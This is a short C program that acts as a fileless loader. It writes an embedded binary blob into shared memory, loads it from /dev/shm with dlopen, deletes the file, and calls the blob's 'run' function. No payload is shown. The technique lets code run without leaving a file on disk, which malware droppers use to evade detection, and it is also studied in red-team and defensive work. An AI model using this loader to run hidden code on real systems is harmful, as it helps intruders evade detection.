#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <dlfcn.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h> 
#include "blob.h"

#define SHM_NAME "shm"

int open_shm(void) {
    int fd;
    fd = shm_open(SHM_NAME, O_RDWR | O_CREAT, S_IRWXU);
    
    if(fd < 0)
        exit(-1);

    return fd;
}

void write_to_shm(int fd) {
    if(write(fd, blob, blob_len) != blob_len) {
        close(fd);
        exit(-1);
    }
}

void *load_so(int fd) {
    char path[1024];
    void *handle;

    close(fd);
    snprintf(path, 1024, "/dev/shm/%s", SHM_NAME);
    handle = dlopen(path, RTLD_NOW);
    remove("/dev/shm/shm");

	if (!handle)
		exit(-1);

    return handle;
}

int main(void) {
    void *handle = NULL;
    int fd = -1;
    
    fd = open_shm();
    write_to_shm(fd);
    handle = load_so(fd);
    
    void (*fptr)(void) = (void(*)(void))dlsym(handle, "run");
    (*fptr)();

    exit(0);
}